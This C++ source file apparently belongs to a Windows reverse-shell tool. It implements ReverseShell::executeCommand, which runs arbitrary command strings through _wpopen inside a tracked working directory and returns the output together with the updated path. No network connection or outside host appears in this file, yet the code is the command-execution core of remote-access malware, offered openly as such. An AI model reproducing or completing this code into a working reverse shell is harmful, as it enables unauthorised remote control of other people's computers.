#include <fcntl.h>
#include "ReverseShell.h"
#include "../converter/Converter.h"


std::string ReverseShell::executeCommand(const std::wstring & command) {
    std::array<wchar_t, 128> buffer{};
    std::wstring result;
    std::wstring completeCommand = L"cd "+currentDirectory+L" & "+command+L" & echo. & cd";
    std::unique_ptr<FILE, decltype(&pclose)> pipe(_wpopen(completeCommand.c_str(), L"r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgetws(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }

    size_t initialPos =  result.find_last_of('\n',result.find_last_not_of('\n'));
    std::wstring currentDirectorySubstring =  result.substr(initialPos+1,result.length()-initialPos-2);
    result = result.substr(0,initialPos);
    currentDirectory = currentDirectorySubstring;
    result.append(L"|"+currentDirectorySubstring);
    return Converter::wstring2string(result);
}

